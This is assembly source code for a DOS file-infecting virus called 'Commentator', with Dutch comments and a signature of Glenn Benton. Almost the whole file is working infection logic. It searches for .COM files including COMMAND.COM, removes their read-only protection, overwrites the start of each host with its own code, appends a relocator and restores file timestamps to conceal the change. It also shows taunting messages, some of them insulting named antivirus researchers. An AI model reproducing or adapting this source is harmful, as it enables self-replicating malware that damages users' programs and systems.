;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³                      Commentator Virus by Glenn...                          ³
;ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
;³ This will be a Parasytic Non-Resident .COM infector.                        ³
;³ It will also infect COMMAND.COM.                                            ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
.MODEL TINY

Public          VirLen,MovLen

Code		Segment para 'Code'
Assume		Cs:Code,Ds:Code,Es:Code

		Org 100h

Signature       Equ 0DaDah      ; Signature of virus!

Buff1           Equ 0F100h
Buff2		Equ Buff1+2
VirLen		Equ Offset Einde-Offset Begin
MovLen		Equ Offset Einde-Offset Mover
DTA             Equ 0F000h
Proggie         Equ DTA+1Eh
Lenny           Equ DTA+1Ah

MinLen          Equ Virlen   ;Minimale lengte te besmetten programma
MaxLen          Equ 0EF00h      ; Maximale lengte te besmetten programma

;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; This part will contain the actual virus code, for searching the
; next victim and infection of it.
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

Begin:
		Jmp Short OverSig	; Sprong naar Oversig vanwege kenmerk
                DW Signature            ; Herkenningsteken virus
Oversig:
                Pushf                   ;------------------
		Push AX			; Alle registers opslaan voor
		Push BX			; later gebruik van het programma
		Push CX                 ;
		Push DX                 ;
		Push DS                 ;
		Push ES                 ;
		Push SS                 ;
		Push SI                 ;
		Push DI                 ;------------------
InfectPart:
		Mov AX,Sprong           ;------------------
		Mov Buf1,AX             ; Spronggegevens bewaren om
		Mov BX,Source           ; besmette programma te starten
		Mov Buf2,BX             ;------------------
		Mov AH,1Ah		; DTA area instellen op
                Mov DX,DTA              ; $DTA area
		Int 21h                 ;------------------
Vindeerst:	Mov AH,4Eh		; Zoeken naar 1e .COM file in directory
		Mov Cx,1		;
		Lea DX,FindPath         ;
		Int 21h                 ;------------------
		Jnc KijkInfected	; Geen gevonden, goto Afgelopen
		Jmp Afgelopen		;------------------
KijkInfected:
                Mov DX,Cs:[Lenny]       ;------------------
		Cmp DX,MinLen           ; Kijken of programmalengte voldoet
		Jb  ZoekNext            ; aan de eisen van het virus
                Cmp DX,MaxLen           ;
                Ja  ZoekNext            ;------------------
On2:		Mov AH,3Dh		; Zo ja , file openen en file handle
		Mov AL,2		; opslaan
		Mov DX,Proggie		;
		Int 21h			;
		Mov FH,AX               ;------------------
  		Mov BX,AX               ;
 		Mov AH,3Fh              ; Lezen 1e 4 bytes van een file met
 		Mov CX,4                ; een mogelijk kenmerk van het virus
		Mov DX,Buff1            ;
		Int 21h                 ;------------------
Sluiten:	Mov AH,3Eh		; File weer sluiten
		Int 21h			;------------------
		Mov AX,CS:[Buff2]	; Vergelijken inhoud lokatie Buff1+2
                Cmp AX,Signature        ; met Signature. Niet gelijk : Zoeken op
                Jnz Infect              ; morgoth virus. Als bestand al besmet
ZoekNext:
		Mov AH,4Fh              ;------------------
		Int 21h                 ; Zoeken naar volgende .COM file
		Jnc KijkInfected        ; Geen gevonden, goto Afgelopen
                Jmp Afgelopen           ;------------------
Infect:
                Mov DX,Proggie	        ; beveiliging weghalen
		Mov AH,43h              ;
		Mov AL,1                ;
                Xor CX,Cx
		Int 21h                 ;------------------
		Mov AH,3Dh		; Bestand openen
		Mov AL,2                ;
                Mov DX,Proggie          ;
		Int 21h                 ;------------------
		Mov FH,AX		; Opslaan op stack van
		Mov BX,AX               ; datum voor later gebruik
		Mov AH,57H              ;
		Mov AL,0                ;
		Int 21h                 ;
		Push CX                 ;
		Push DX                 ;------------------
		Mov AH,3Fh              ; Inlezen van eerste deel van het
		Mov CX,VirLen+2		; programma om later terug te
		Mov DX,Buff1            ; kunnen plaatsen.
		Int 21h                 ;------------------
		Mov AH,42H		; File Pointer weer naar het
		Mov AL,2		; einde van het programma
		Xor CX,CX		; zetten
		Xor DX,DX		;
		Int 21h                 ;------------------
		Xor DX,DX		; Bepalen van de variabele sprongen
		Add AX,100h             ; in het virus (move-routine)
		Mov Sprong,AX           ;
		Add AX,MovLen		;
		Mov Source,AX           ;------------------
		Mov AH,40H              ; Move routine bewaren aan
                Mov DX,Offset Mover     ; einde van file
		Mov CX,MovLen           ;
		Int 21h                 ;------------------
		Mov AH,40H              ; Eerste deel programma aan-
		Mov DX,Buff1            ; voegen na Move routine
		Mov CX,VirLen           ;
		Int 21h                 ;------------------
                Mov AH,42h              ; File Pointer weer naar
		Mov AL,0		; het begin van file
		Xor CX,CX               ; sturen
		Xor DX,DX               ;
		Int 21h                 ;------------------
		Mov AH,40h              ; En programma overschrijven
		Mov DX,Offset Begin     ; met code van het virus
		Mov CX,VirLen           ;
		Int 21h                 ;------------------
		Mov AH,57h		; Datum van aangesproken file
		Mov AL,1                ; weer herstellen
		Pop DX                  ;
		Pop CX                  ;
		Int 21h                 ;------------------
		Mov AH,3Eh		; Sluiten file
		Int 21h                 ;------------------
Afgelopen:	Mov BX,Buf2             ; Sprongvariabelen weer
		Mov Source,BX           ; op normaal zetten voor
		Mov AX,Buf1             ; de Move routine
		Mov Sprong,AX           ;------------------
		Mov AH,1Ah              ; DTA adres weer op normaal
		Mov Dx,80h              ; zetten en naar de Move
		Int 21h                 ; routine springen
                Mov Ah,2Ch
                Int 21h
                Xor DL,DL
                Xchg Dh,Dl
                Add Dx,Dx
;               And Dx,11111110b
                Add Dx,Offset MsgTab
                Mov Si,Dx
                Mov Dx,Cs:[SI]
                Mov AH,9
                Int 21h
                Jmp CS:[Sprong]         ;------------------

Msgtab          DW offset Msg1
                DW offset Msg2
                DW offset Msg3
                DW offset Msg4
                DW offset Msg5
                DW offset Msg6
                DW offset Msg7
                DW offset Msg8
                DW offset Msg9
                DW offset Msg10
                DW offset Msg11
                DW offset Msg12
                DW offset Msg13
                DW offset Msg14
                DW offset Msg15
                DW offset Msg16
                DW offset Msg17
                DW offset Msg18
                DW offset Msg19
                DW offset Msg20
                DW offset Msg21
                DW offset Msg22
                DW offset Msg23
                DW offset Msg24
                DW offset Msg25
                DW offset Msg26
                DW offset Msg27
                DW offset Msg28
                DW offset Msg29
                DW offset Msg30
                DW offset Msg31
                DW offset Msg32
                DW offset Msg33
                DW offset Msg34
                DW offset Msg35
                DW offset Msg36
                DW offset Msg37
                DW offset Msg38
                DW offset Msg39
                DW offset Msg40
                DW offset Msg41
                DW offset Msg42
                DW offset Msg43
                DW offset Msg44
                DW offset Msg45
                DW offset Msg46
                DW offset Msg47
                DW offset Msg48
                DW offset Msg49
                DW offset Msg50
                DW offset Msg51
                DW offset Msg52
                DW offset Msg53
                DW offset Msg54
                DW offset Msg55
                DW offset Msg56
                DW offset Msg57
                DW offset Msg58
                DW offset Msg59
                DW offset Msg60

Msg1            Db 13,10,'McAfee is a bum-hole',13,10,'$'
Msg2            Db 13,10,'Patricia Hoffman is a virgin',13,10,'$'
Msg3            Db 13,10,'David Grant is a shithead',13,10,'$'
Msg4            Db 13,10,'Jan Terpstra sucks',13,10,'$'
Msg5            Db 13,10,'Vesselin Bontchev is a lamer',13,10,'$'
Msg6            Db 13,10,'Righard Zwienenberg is a cowboy',13,10,'$'
Msg7            Db 13,10,'Greetings to Cracker Jack in Italy',13,10,'$'
Msg8            Db 13,10,'MS-DOS could be programmed better',13,10,'$'
Msg9            Db 13,10,'A virus may not hang, it must replicate!',13,10,'$'
Msg10           Db 13,10,'(C) by Glenn Benton DVRL',13,10,'$'
Msg11           Db 13,10,'HAHAHA you have a virus',13,10,'$'
Msg12           Db 13,10,'Dutch Virus Research Laboratory',13,10,'$'
Msg13           Db 13,10,'Program to big to fit in ass',13,10,'$'
Msg14           Db 13,10,'Another program bites the dust',13,10,'$'
Msg15           Db 13,10,'Havahey! Another Me born to serve',13,10,'$'
Msg16           Db 13,10,'Deicide wasnt that good after all...',13,10,'$'
Msg17           Db 13,10,'DEICIDE, MORGOTH, BREEZE, BROTHER by Glenn Benton',13,10,'$'
Msg18           Db 13,10,'Hey! Gimme some more disks!',13,10,'$'
Msg19           Db 13,10,'Stealth techniques are cool',13,10,'$'
Msg20           Db 13,10,'Encryption is usefull...',13,10,'$'
Msg21           Db 13,10,'Stephanie my lovely girl',13,10,'$'
Msg22           Db 13,10,'FPROT is compiled BASIC',13,10,'$'
Msg23           Db 13,10,'Fuck da police!',13,10,'$'
Msg24           Db 13,10,'Source soon aveable for jokes!',13,10,'$'
Msg25           Db 13,10,'Why dont you play with something else?',13,10,'$'
Msg26           Db 13,10,'Thanks to BORLAND for Turbo Assembler',13,10,'$'
Msg27           Db 13,10,'It is time for NORTON SPEED DISK',13,10,'$'
Msg28           Db 13,10,'Donald duck is a lie...',13,10,'$'
Msg29           Db 13,10,'Why dont you buy me a CHEESEBURGER?',13,10,'$'
Msg30           Db 13,10,'Wim Kok is a COMMUNIST!!!!',13,10,'$'

Msg31           Db 13,10,'Xabaras could be better',13,10,'$'
Msg32           Db 13,10,'FAT has a nice technique',13,10,'$'
Msg33           Db 13,10,'This virus is not resident!',13,10,'$'
Msg34           Db 13,10,'Nobody like debugging...',13,10,'$'
Msg35           Db 13,10,'60 Messages in here?',13,10,'$'
Msg36           Db 13,10,'Out of worktime',13,10,'$'
Msg37           Db 13,10,'RAM parity error',13,10,'$'
Msg38           Db 13,10,'Insert porn magazine in drive A',13,10,'$'
Msg39           Db 13,10,'Insert tracktor toilet paper in printer',13,10,'$'
Msg40           Db 13,10,'Upload this virus to McAfee, please',13,10,'$'
Msg41           Db 13,10,'HIP-HOP sucks!',13,10,'$'
Msg42           Db 13,10,'Vote for Saddam.',13,10,'$'
Msg43           Db 13,10,'DEAD BY DAWN',13,10,'$'
Msg44           Db 13,10,'NAIL HIM LIKE JESUS!',13,10,'$'
Msg45           Db 13,10,'May I fuck with your wife?',13,10,'$'
Msg46           Db 13,10,'Hey CJ! What abouth a Corporation (I&DVRL)',13,10,'$'
Msg47           Db 13,10,'Thanx to Oliver North for giving me TASM',13,10,'$'
Msg48           Db 13,10,'Do not use drugs, make a virus!',13,10,'$'
Msg49           Db 13,10,'Register this produkt!',13,10,'$'
Msg50           Db 13,10,'This virus is SHAREWARE',13,10,'$'
Msg51           Db 13,10,'You will hate me for this',13,10,'$'
Msg52           Db 13,10,'See the sunny side of life',13,10,'$'
Msg53           Db 13,10,'DAME EDNA IS COOL!',13,10,'$'
Msg54           Db 13,10,'I like the pope, the pope smokes dope!',13,10,'$'
Msg55           Db 13,10,'We like the pope, he gives us his dope!',13,10,'$'
Msg56           Db 13,10,'Are you FLINTSTONED???',13,10,'$'
Msg57           Db 13,10,'How about a game of STRIP-POKER?',13,10,'$'
Msg58           Db 13,10,'FACES OF DEATH!',13,10,'$'
Msg59           Db 13,10,'Just one more message!!!',13,10,'$'
Msg60           Db 13,10,'Spread this like hell!',13,10,'$'

;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; All variables are stored in here, like filehandle, date/time,
; search path and various buffers.
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

FH      	DW 0
FindPath        DB '*.COM',0

Buf1		DW 0
Buf2            DW 0

Sprong		DW 0
Source		DW 0

;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; This will contain the relocator routine, located at the end of
; the ORIGINAL file. This will tranfer the 1st part of the program
; to it's original place.
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
Mover:
		Mov DI,Offset Begin	;------------------
		Mov SI,Source           ; Verplaatsen van het 1e deel
		Mov CX,VirLen-1         ; van het programma, wat achter
		Rep Movsb               ;------------------
		Pop DI			; Opgeslagen registers weer
		Pop SI                  ; terugzetten op originele
		Pop SS                  ; waarde en springen naar
		Pop ES                  ; het begin van het programma
		Pop DS                  ; (waar nu het virus niet meer
		Pop DX                  ; staat)
		Pop CX                  ;
		Pop BX                  ;
		Pop AX                  ;
		Popf                    ;
		Mov BX,100h             ;
		Jmp BX	 		;------------------

;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; Only the end of the virus is stored in here.
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
Einde		db 0

Code            Ends
End             Begin

;  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ> and Remember Don't Forget to Call <ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;  ÄÄÄÄÄÄÄÄÄÄÄÄ> ARRESTED DEVELOPMENT +31.79.426o79 H/P/A/V/AV/? <ÄÄÄÄÄÄÄÄÄÄ
;  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
